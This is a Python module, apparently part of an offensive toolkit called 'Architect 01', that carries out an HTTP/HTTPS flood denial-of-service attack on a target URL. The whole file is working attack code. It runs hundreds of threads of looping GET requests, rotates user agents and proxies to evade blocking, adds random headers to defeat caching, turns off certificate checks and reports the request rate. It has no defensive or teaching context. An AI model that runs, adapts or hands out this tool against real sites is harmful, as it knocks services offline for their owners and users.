#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
HTTP/HTTPS Flood Attack
Architect 01 - Professional Suite
SUPPORT ALL PROTOCOLS
"""

import requests
import threading
import time
import random
from urllib.parse import urlparse
from colorama import Fore, Style
from core.utils.useragents import get_random_ua
from core.utils.proxy_manager import ProxyManager

class HTTPFlood:
    """HTTP/HTTPS Flood Attack - Support semua protocol"""
    
    def __init__(self, target_url, threads=500, use_proxy=False):
        self.target_url = target_url
        self.threads = threads
        self.use_proxy = use_proxy
        self.running = True
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        
        # Parse URL buat dapetin scheme
        self.parsed = urlparse(target_url)
        self.scheme = self.parsed.scheme or 'http'
        
        self.proxy_manager = ProxyManager() if use_proxy else None
        self.session = requests.Session()
        self.session.headers.update({'Connection': 'keep-alive'})
        
    def attack_worker(self):
        """Worker thread for sending requests"""
        while self.running:
            try:
                ua = get_random_ua()
                
                headers = {
                    'User-Agent': ua,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.8', 'en-GB,en;q=0.7']),
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
                
                if random.random() > 0.7:
                    headers[f'X-{random.randint(1000, 9999)}'] = str(random.randint(1, 999999))
                
                proxies = None
                if self.use_proxy and self.proxy_manager:
                    proxies = self.proxy_manager.get_random_proxy()
                
                # Kirim request
                response = self.session.get(
                    self.target_url,
                    headers=headers,
                    proxies=proxies,
                    timeout=10,
                    verify=False,
                    allow_redirects=True
                )
                
                self.total_requests += 1
                if response.status_code < 400 or response.status_code == 404:  # 404 tetep dihitung success
                    self.successful_requests += 1
                else:
                    self.failed_requests += 1
                
                if self.total_requests % 100 == 0:
                    print(Fore.GREEN + "╰─❯ [" + threading.current_thread().name + "] Reqs: " + str(self.total_requests) + " | OK: " + str(self.successful_requests) + " | Fail: " + str(self.failed_requests) + Style.RESET_ALL)
                
                time.sleep(random.uniform(0.001, 0.01))
                
            except requests.exceptions.ProxyError:
                self.failed_requests += 1
                if self.use_proxy and self.proxy_manager:
                    self.proxy_manager.rotate_proxy()
            except requests.exceptions.ConnectionError:
                self.failed_requests += 1
                # Coba reconnect
                self.session = requests.Session()
                time.sleep(0.5)
            except requests.exceptions.Timeout:
                self.failed_requests += 1
            except Exception:
                self.failed_requests += 1
                time.sleep(0.1)
    
    def start(self):
        """Start the HTTP flood attack"""
        print(Fore.YELLOW + "\n╰─❯ Starting HTTP/HTTPS Flood on " + self.target_url)
        print(Fore.YELLOW + "╰─❯ Protocol: " + self.scheme.upper())
        print(Fore.YELLOW + "╰─❯ Threads: " + str(self.threads))
        print(Fore.YELLOW + "╰─❯ Proxy: " + ('Enabled' if self.use_proxy else 'Disabled'))
        print(Fore.YELLOW + "╰─❯ Press Ctrl+C to stop\n" + Style.RESET_ALL)
        
        requests.packages.urllib3.disable_warnings()
        
        workers = []
        for i in range(self.threads):
            worker = threading.Thread(target=self.attack_worker, name="W" + str(i+1))
            worker.daemon = True
            worker.start()
            workers.append(worker)
        
        try:
            start_time = time.time()
            last_total = 0
            
            while self.running:
                time.sleep(5)
                elapsed = time.time() - start_time
                new_req = self.total_requests - last_total
                rps = new_req / 5
                last_total = self.total_requests
                
                print(Fore.CYAN + "╰─❯ Status: " + str(self.total_requests) + " req | " + str(round(rps, 2)) + " rps | Success: " + str(self.successful_requests) + " | Failed: " + str(self.failed_requests) + Style.RESET_ALL)
                
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        self.running = False
        print(Fore.RED + "\n╰─❯ Stopping HTTP Flood attack...")
        print(Fore.RED + "╰─❯ Total requests sent: " + str(self.total_requests))
        print(Fore.RED + "╰─❯ Successful: " + str(self.successful_requests) + " | Failed: " + str(self.failed_requests) + Style.RESET_ALL)
